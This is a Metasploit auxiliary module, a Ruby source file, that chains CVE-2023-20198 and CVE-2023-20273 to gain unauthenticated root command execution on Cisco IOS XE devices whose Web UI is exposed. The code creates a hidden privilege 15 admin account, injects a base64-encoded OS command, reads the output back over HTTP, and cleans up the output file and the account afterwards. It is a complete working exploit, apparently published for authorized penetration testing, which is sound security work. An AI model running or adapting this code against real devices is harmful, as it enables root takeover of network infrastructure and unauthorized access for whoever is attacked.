##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HTTP::CiscoIosXe
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Retry

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cisco IOX XE unauthenticated OS command execution',
        'Description' => %q{
          This module leverages both CVE-2023-20198 and CVE-2023-20273 against vulnerable instances of Cisco IOS XE
          devices which have the Web UI exposed. An attacker can execute arbitrary OS commands with root privileges.

          This module leverages CVE-2023-20198 to create a new admin user, then authenticating as this user,
          CVE-2023-20273 is leveraged for OS command injection. The output of the command is written to a file and read
          back via the webserver. Finally the output file is deleted and the admin user is removed.

          The vulnerable IOS XE versions are:
          16.1.1, 16.1.2, 16.1.3, 16.2.1, 16.2.2, 16.3.1, 16.3.2, 16.3.3, 16.3.1a, 16.3.4,
          16.3.5, 16.3.5b, 16.3.6, 16.3.7, 16.3.8, 16.3.9, 16.3.10, 16.3.11, 16.4.1, 16.4.2,
          16.4.3, 16.5.1, 16.5.1a, 16.5.1b, 16.5.2, 16.5.3, 16.6.1, 16.6.2, 16.6.3, 16.6.4,
          16.6.5, 16.6.4s, 16.6.4a, 16.6.5a, 16.6.6, 16.6.5b, 16.6.7, 16.6.7a, 16.6.8, 16.6.9,
          16.6.10, 16.7.1, 16.7.1a, 16.7.1b, 16.7.2, 16.7.3, 16.7.4, 16.8.1, 16.8.1a, 16.8.1b,
          16.8.1s, 16.8.1c, 16.8.1d, 16.8.2, 16.8.1e, 16.8.3, 16.9.1, 16.9.2, 16.9.1a, 16.9.1b,
          16.9.1s, 16.9.1c, 16.9.1d, 16.9.3, 16.9.2a, 16.9.2s, 16.9.3h, 16.9.4, 16.9.3s, 16.9.3a,
          16.9.4c, 16.9.5, 16.9.5f, 16.9.6, 16.9.7, 16.9.8, 16.9.8a, 16.9.8b, 16.9.8c, 16.10.1,
          16.10.1a, 16.10.1b, 16.10.1s, 16.10.1c, 16.10.1e, 16.10.1d, 16.10.2, 16.10.1f, 16.10.1g,
          16.10.3, 16.11.1, 16.11.1a, 16.11.1b, 16.11.2, 16.11.1s, 16.11.1c, 16.12.1, 16.12.1s,
          16.12.1a, 16.12.1c, 16.12.1w, 16.12.2, 16.12.1y, 16.12.2a, 16.12.3, 16.12.8, 16.12.2s,
          16.12.1x, 16.12.1t, 16.12.2t, 16.12.4, 16.12.3s, 16.12.1z, 16.12.3a, 16.12.4a, 16.12.5,
          16.12.6, 16.12.1z1, 16.12.5a, 16.12.5b, 16.12.1z2, 16.12.6a, 16.12.7, 16.12.9, 16.12.10,
          17.1.1, 17.1.1a, 17.1.1s, 17.1.2, 17.1.1t, 17.1.3, 17.2.1, 17.2.1r, 17.2.1a, 17.2.1v,
          17.2.2, 17.2.3, 17.3.1, 17.3.2, 17.3.3, 17.3.1a, 17.3.1w, 17.3.2a, 17.3.1x, 17.3.1z,
          17.3.3a, 17.3.4, 17.3.5, 17.3.4a, 17.3.6, 17.3.4b, 17.3.4c, 17.3.5a, 17.3.5b, 17.3.7,
          17.3.8, 17.4.1, 17.4.2, 17.4.1a, 17.4.1b, 17.4.1c, 17.4.2a, 17.5.1, 17.5.1a, 17.5.1b,
          17.5.1c, 17.6.1, 17.6.2, 17.6.1w, 17.6.1a, 17.6.1x, 17.6.3, 17.6.1y, 17.6.1z, 17.6.3a,
          17.6.4, 17.6.1z1, 17.6.5, 17.6.6, 17.7.1, 17.7.1a, 17.7.1b, 17.7.2, 17.10.1, 17.10.1a,
          17.10.1b, 17.8.1, 17.8.1a, 17.9.1, 17.9.1w, 17.9.2, 17.9.1a, 17.9.1x, 17.9.1y, 17.9.3,
          17.9.2a, 17.9.1x1, 17.9.3a, 17.9.4, 17.9.1y1, 17.11.1, 17.11.1a, 17.12.1, 17.12.1a,
          17.11.99SW
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sfewer-r7', # MSF module
        ],
        'References' => [
          ['CVE', '2023-20198'],
          ['CVE', '2023-20273'],
          # Vendor advisories.
          ['URL', 'https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z'],
          ['URL', 'http://web.archive.org/web/20250214093736/https://blog.talosintelligence.com/active-exploitation-of-cisco-ios-xe-software/'],
          # Vendor list of (205) vulnerable versions.
          ['URL', 'https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z/cvrf/cisco-sa-iosxe-webui-privesc-j22SaA4z_cvrf.xml'],
          # Technical details on CVE-2023-20198.
          ['URL', 'https://www.horizon3.ai/cisco-ios-xe-cve-2023-20198-theory-crafting/'],
          ['URL', 'https://www.horizon3.ai/cisco-ios-xe-cve-2023-20198-deep-dive-and-poc/'],
          # Technical details on CVE-2023-20273.
          ['URL', 'https://blog.leakix.net/2023/10/cisco-root-privesc/']
        ],
        'DisclosureDate' => '2023-10-16',
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('CMD', [ true, 'The OS command to execute.', 'id']),
        OptString.new('CISCO_ADMIN_USERNAME', [false, 'The username of an admin account. If not set, CVE-2023-20198 is leveraged to create a new admin account.']),
        OptString.new('CISCO_ADMIN_PASSWORD', [false, 'The password of an admin account. If not set, CVE-2023-20198 is leveraged to create a new admin password.']),
        OptInt.new('REMOVE_OUTPUT_TIMEOUT', [true, 'The maximum timeout (in seconds) to wait when trying to removing the commands output file.', 30])
      ]
    )
  end

  def run
    # If the user has supplied a username/password, we can use these creds to leverage CVE-2023-20273 and execute an OS
    # command. If a username/password have not been supplied, we can leverage CVE-2023-20198 to create a new admin
    # account, and then leverage CVE-2023-20273 to execute an OS command. This opens up the ability to leverage the
    # auxiliary module for CVE-2023-20198 to create a new admin account once, then use those new admin creds in this
    # module to execute multiple OS command without the need to create a new 'temporary' admin account for every
    # invocation of this module (which will reduce the noise in the devices logs).
    if !datastore['CISCO_ADMIN_USERNAME'].blank? && !datastore['CISCO_ADMIN_PASSWORD'].blank?
      exececute_os_command(datastore['CISCO_ADMIN_USERNAME'], datastore['CISCO_ADMIN_PASSWORD'])
    else
      admin_username = Rex::Text.rand_text_alpha(8)
      admin_password = Rex::Text.rand_text_alpha(8)

      unless run_cli_command("username #{admin_username} privilege 15 secret #{admin_password}", Mode::GLOBAL_CONFIGURATION)
        print_error('Failed to create admin user')
        return
      end

      begin
        vprint_status("Created privilege 15 user '#{admin_username}' with password '#{admin_password}'")

        exececute_os_command(admin_username, admin_password)
      ensure
        vprint_status("Removing user '#{admin_username}'")

        unless run_cli_command("no username #{admin_username}", Mode::GLOBAL_CONFIGURATION)
          print_warning('Failed to remove user')
        end
      end
    end
  end

  def exececute_os_command(admin_username, admin_password)
    out_file = Rex::Text.rand_text_alpha(8)

    cmd = "$(openssl enc -base64 -d <<< #{Base64.strict_encode64(datastore['CMD'])}) &> /var/www/#{out_file}"

    unless run_os_command(cmd, admin_username, admin_password)
      print_error('Failed to run command')
      return
    end

    begin
      res = send_request_cgi(
        'method' => 'GET',
        'uri' => normalize_uri('webui', out_file),
        'headers' => {
          'Authorization' => basic_auth(admin_username, admin_password)
        }
      )

      unless res&.code == 200
        print_error('Failed to get command output')
        return
      end

      print_line(res.body)
    ensure
      vprint_status("Removing output file '/var/www/#{out_file}'")

      # Deleting the output file can take more than one attempt.
      success = retry_until_truthy(timeout: datastore['REMOVE_OUTPUT_TIMEOUT']) do
        if run_os_command("rm /var/www/#{out_file}", admin_username, admin_password)
          next true
        end

        vprint_status('Failed to delete output file, waiting and trying again...')
        false
      end

      unless success
        print_error("Failed to delete output file '/var/www/#{out_file}")
        print_error(out_file)
      end
    end
  end
end
